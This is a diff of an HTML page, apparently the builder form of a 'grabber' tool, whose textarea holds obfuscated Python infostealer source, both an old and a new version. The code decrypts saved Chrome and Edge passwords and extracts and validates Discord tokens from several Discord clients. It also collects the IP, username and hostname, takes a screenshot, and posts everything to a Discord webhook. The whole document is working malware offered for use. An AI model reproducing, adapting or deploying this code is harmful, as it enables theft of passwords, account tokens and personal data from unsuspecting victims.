@@ -39,45 +39,81 @@
                         </div>
                         <div class="mb-2">
                             <label for="script">Pythonスクリプト（変更は開発者向け）（WebhookURLの定数はWEBHOOK_URLです、定義はこのコードの前に来ます）:</label>
-                            <textarea class="form-control" id="script" name="script" rows="20">I='loginData'
-H='utf-8'
-G='discordData.zip'
-D=open
-import win32crypt as S,requests as E,zipfile as J,getpass as P,sqlite3 as T,shutil as U,socket as Q,base64 as V,json,mss,os as A
-from Crypto.Cipher import AES
-B=A.getenv('LOCALAPPDATA')
-K=A.getenv('APPDATA')
-W=[f"{B}\\Google\\Chrome",f"{B}\\Microsoft\\Edge"]
-L=''
+                            <textarea class="form-control" id="script" name="script" rows="20">O='encrypted_key'
+N='os_crypt'
+K='loginData'
+G='utf-8'
+F=open
+B=None
+L=WEBHOOK_URL
+import win32crypt as M,requests as D,getpass as P,sqlite3 as Y,shutil as Z,socket as Q,base64 as I,json as J,mss,re,os as A
+from Crypto.Cipher import AES as E
+H=A.getenv('LOCALAPPDATA')
+C=A.getenv('APPDATA')
+a=[f"{H}\\Google\\Chrome",f"{H}\\Microsoft\\Edge",f"{H}\\Google\\Chrome SxS"]
+S=[f"{C}\\discord",f"{C}\\discordcanary",f"{C}\\Lightcord",f"{C}\\discordptb"]
+W=''
+def T(token):
+    A=token
+    if not A:return False
+    C={'Content-Type':'application/json','Authorization':A};B=D.get('https://discord.com/api/v9/users/@me',headers=C);return str(B.status_code)[0]=='2',B.text
 def R():
-    B=A.path.join(K,'discord','Local Storage','leveldb')
-    if not A.path.exists(B):return
-    for C in A.listdir(B):
-        if C.endswith(('.log','.ldb')):
-            with J.ZipFile(G,'w')as D:D.write(A.path.join(B,C))
-def X():
-    G=None;C='===== Find Chromium Datas =====\n'
-    for dir in W:
-        J=f"{dir}\\User Data\\Local State"
-        if not A.path.exists(J):return
-        C+='===== '+dir.split('\\')[-1]+' =====\n'
-        with D(J,encoding=H)as X:K=json.load(X)
-        L=K['profile']['info_cache'];B=K['os_crypt']['encrypted_key'];B=B.encode(H);B=V.b64decode(B)[5:];Y=S.CryptUnprotectData(B,G,G,G,0)[1]
-        for F in L:
-            M=L[F];C+=F+':\n    Email:'+M['user_name']+'\n    Name:'+M['gaia_name']+'\n    LoginData:\n';Z=f"{dir}\\User Data\\{F}\\Login Data";U.copy2(Z,I);N=T.connect(I);O=N.cursor();O.execute('SELECT action_url, username_value, password_value FROM logins')
-            for(d,E)in enumerate(O.fetchall()):
-                P=E[0];Q=E[1];a=E[2][3:15];b=E[2][15:-16];c=AES.new(Y,AES.MODE_GCM,a);R=c.decrypt(b).decode()
-                if P and Q and R:C+=f"\n        ServiceUrl:{P}\n        Username:{Q}\n        Password:{R}\n"
-            N.close()
-    return C
-def C():
-    N='rb';M='screenshot.png';L='resultLoginData.txt';C='file';print('Start....');S=X()
-    with D(L,encoding=H,mode='w')as T:T.write(S)
-    R();U=E.get('https://ifconfig.me').text;V=P.getuser();W=Q.gethostname();Y={'left':0,'top':0,'width':1920,'height':1080}
-    with mss.mss()as Z:B=Z.grab(Y);mss.tools.to_png(B.rgb,B.size,output=M)
-    B=D(M,N);J=D(G,N);K=D(L,N);O={C:B,C:J,C:K};E.post(WEBHOOK_URL,data={'content':f"# Grabber Result\n```\nIP:{U}\nUseUser:{V}\nHostName:{W}```"},files={C:B});E.post(F,files={C:J});E.post(F,files={C:K});B.close();J.close();K.close();O=[G,I,M,L]
-    for a in O:A.remove(a)
-if __name__=='__main__':C()</textarea>
+    H={}
+    for P in S:
+        U=f"{P}\\Local State";K=f"{P}\\Local Storage\\leveldb"
+        if not A.path.exists(K):continue
+        with F(U,encoding=G)as V:W=J.load(V)
+        C=W[N][O];C=C.encode(G);C=I.b64decode(C)[5:];X=M.CryptUnprotectData(C,B,B,B,0)[1]
+        for D in A.listdir(K):
+            if not D.endswith(('.log','.ldb')):continue
+            with F(A.path.join(K,D),'r',errors='ignore')as D:
+                Y=D.readlines()
+                for Z in Y:
+                    for a in re.findall('dQw4w9WgXcQ:[^"]*',Z):
+                        try:
+                            Q=I.b64decode(a.split('dQw4w9WgXcQ:')[1]);b=Q[3:15];c=Q[15:];d=E.new(X,E.MODE_GCM,b);L=d.decrypt(c)[:-16].decode();R=T(L)
+                            if R[0]:
+                                if L in H:continue
+                                H[L]=R[1];break
+                        except Exception as e:continue
+    return H
+def U():
+    D='===== Find Chromium Datas =====\n'
+    for dir in a:
+        P=f"{dir}\\User Data\\Local State"
+        if not A.path.exists(P):continue
+        D+='===== '+dir.split('\\')[-1]+' =====\n'
+        with F(P,encoding=G)as b:Q=J.load(b)
+        R=Q['profile']['info_cache'];C=Q[N][O];C=C.encode(G);C=I.b64decode(C)[5:];c=M.CryptUnprotectData(C,B,B,B,0)[1]
+        for L in R:
+            S=R[L];D+=L+':\n    Email:'+S['user_name']+'\n    Name:'+S['gaia_name']+'\n    LoginData:\n';d=f"{dir}\\User Data\\{L}\\Login Data";Z.copy2(d,K);T=Y.connect(K);U=T.cursor();U.execute('SELECT action_url, username_value, password_value FROM logins')
+            for(h,H)in enumerate(U.fetchall()):
+                V=H[0];W=H[1];e=H[2][3:15];f=H[2][15:-16];g=E.new(c,E.MODE_GCM,e);X=g.decrypt(f).decode()
+                if V and W and X:D+=f"\n        ServiceUrl:{V}\n        Username:{W}\n        Password:{X}\n"
+            T.close()
+    return D
+def V():
+    M='file';G='screenshot.png';print('Start....');N=U();H=R();O=D.get('https://ifconfig.me').text;S=P.getuser();T=Q.gethostname();V={'left':0,'top':0,'width':1920,'height':1080}
+    with mss.mss()as W:B=W.grab(V);mss.tools.to_png(B.rgb,B.size,output=G)
+    B=F(G,'rb');E=f"""# Grabber Result
+```
+IP:{O}
+UseUser:{S}
+HostName:{T}```
+## Tokens
+```
+"""
+    for I in H:C=J.loads(H[I]);E+=f"""Token - {I}
+UserId - {C["id"]}
+UserName - {C["username"]}
+GlobalName - {C["global_name"]}
+Email - {C["email"]}
+PhoneNumber - {C["phone"]}
+
+"""
+    E+='```';D.post(L,data={'content':E},files={M:B});D.post(L,files={M:('loginData.txt',N.encode())});B.close();X=[K,G]
+    for Y in X:A.remove(Y)
+if __name__=='__main__':V()</textarea>
                         </div>
                         <button type="submit" id="submit" class="btn btn-primary">
                             <span class="spinner-border spinner-border-sm d-none" role="status" aria-hidden="true"></span>
